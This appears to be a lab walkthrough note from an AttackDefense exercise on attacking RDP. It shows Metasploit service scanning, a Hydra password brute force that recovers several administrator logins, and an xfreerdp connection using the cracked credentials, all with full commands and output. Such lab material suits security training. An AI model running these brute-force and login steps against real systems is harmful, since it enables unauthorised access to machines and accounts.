# RDP

## Scan for Endpoint

```bash
msf5 > use auxiliary/scanner/rdp/rdp_scanner

msf5 auxiliary(scanner/rdp/rdp_scanner) > options

Module options (auxiliary/scanner/rdp/rdp_scanner):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DETECT_NLA       true             yes       Detect Network Level Authentication (NLA)
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect, UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = random
   RHOSTS                            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT            3389             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/rdp/rdp_scanner) > setg RHOSTS 10.4.23.146
RHOSTS => 10.4.23.146

msf5 auxiliary(scanner/rdp/rdp_scanner) > setg RPORT 3333
RPORT => 3333

msf5 auxiliary(scanner/rdp/rdp_scanner) > exploit

[*] 10.4.23.146:3333      - Detected RDP on 10.4.23.146:3333      (Windows version: 6.3.9600) (Requires NLA: Yes)
[*] 10.4.23.146:3333      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Brute Force

### Hydra

```bash
root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://$target -s 3333
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-23 19:01:34
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 7063 login tries (l:7/p:1009), ~1766 tries per task
[DATA] attacking rdp://10.4.23.146:3333/
[3333][rdp] host: 10.4.23.146   login: sysadmin   password: samantha
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.4.23.146   login: demo   password: victoria
[ERROR] freerdp: The connection failed to establish.
[3333][rdp] host: 10.4.23.146   login: auditor   password: elizabeth
[ERROR] freerdp: The connection failed to establish.
[STATUS] 5270.00 tries/min, 5270 tries in 00:01h, 1793 to do in 00:01h, 4 active
[3333][rdp] host: 10.4.23.146   login: administrator   password: qwertyuiop
[ERROR] freerdp: The connection failed to establish.
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-23 19:02:59
```

## Connect 
```bash
root@attackdefense:~# xfreerdp /u:administrator /p:qwertyuiop /v:$target:3333
[19:04:28:613] [177736:177737] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.4.23.146:3333)
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - Common Name (CN):
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - 	WIN-OMCNBKR66MN
[19:04:28:663] [177736:177737] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.4.23.146:3333 (RDP-Server):
	Common Name: WIN-OMCNBKR66MN
	Subject:     CN = WIN-OMCNBKR66MN
	Issuer:      CN = WIN-OMCNBKR66MN
	Thumbprint:  2d:f1:c5:c0:02:7f:0e:e9:5b:f7:68:3b:cd:e0:41:ce:63:4f:28:a7
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
```